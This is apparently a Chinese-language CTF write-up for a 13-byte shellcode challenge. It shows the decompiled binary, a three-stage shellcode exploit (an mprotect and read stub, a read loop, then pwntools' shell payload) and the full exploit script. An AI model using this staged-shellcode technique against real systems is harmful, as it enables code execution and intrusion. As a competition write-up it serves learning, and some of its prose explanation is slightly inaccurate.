---
layout: single
title: "shellcode"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "记录 2026 年 ctf+ 比赛中 shellcode 题目的分析与解题过程。"
source_folder: "Write-ups/2026/ctf+"
lang: zh-CN
excerpt: "记录 2026 年 ctf+ 比赛中 shellcode 题目的分析与解题过程。"
---
{% raw %}

# 反编译

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  buf = (void *)(int)mmap((void *)0x114000, 0x1000u, 7, 34, -1, 0);
  puts("shellcode:");
  read(0, buf, 0xDu);
  mprotect(buf, 0x1000u, 4);
  ((void (*)(void))buf)();
  return 0;
}
```

# 思路

给了 13 bytes 的写入，给了全的权限，之修改会只可执行，最后调用。
这里`nmap()`申请的 0x1000 的内存，`mprotect()`将所有内存的执行权限都改为了只可写。

## step 1

所以，第一次调用要先改内存权限，再写入下次 shellcode ：
![shellcode0](/assets/ctf/f5f8187e16e05db93832.webp)

```python
    sc0 = bytes(asm(''' mov dl, 0xf
                        push 0xa
                        pop rax
                        syscall

                        mov esi, edi
                        push rax
                        pop rdi
                        syscall
                        '''))
```

## step 2

上一步执行完后，结果如下：

![shellcode0-](/assets/ctf/72842d15222b7d7820ea.webp)
![shellcode](/assets/ctf/8a990ee101bf3895ff36.webp)

这次的写入，长度明显不足以 get shell，所以需要在构造一次长的写入：

```python
    sc1 = bytes(asm('''
                start:
                    xor eax, eax
                    xchg ecx, edx
                    syscall
                    ''' + 'nop\n'*7 + '''
                    jmp start
                    '''))
```

## step 3

上一步构造的写入：

![IMG-20260521204911665](/assets/ctf/7d3df785958a1665f9eb.webp)

加上适当 nop 后，直接写 shellcode：

```python
   sc2 = bytes(asm('nop\n'*6+ shellcraft.sh()))
```


# exp

```python
def pwn():
    sc0 = bytes(asm(''' mov dl, 0xf
                        push 0xa
                        pop rax   
                        syscall

                        mov esi, edi
                        push rax
                        pop rdi   
                        syscall   
                        '''))
    sa(b'shellcode:',sc0)
    dbg()
    sc1 = bytes(asm('''
                start:
                    xor eax, eax
                    xchg ecx, edx
                    syscall
                    ''' + 'nop\n'*7 + '''
                    jmp start
                    '''))
    s(sc1)
    sc2 = bytes(asm('nop\n'*6+ shellcraft.sh()))
    sl(sc2)

    ia()
```

{% endraw %}
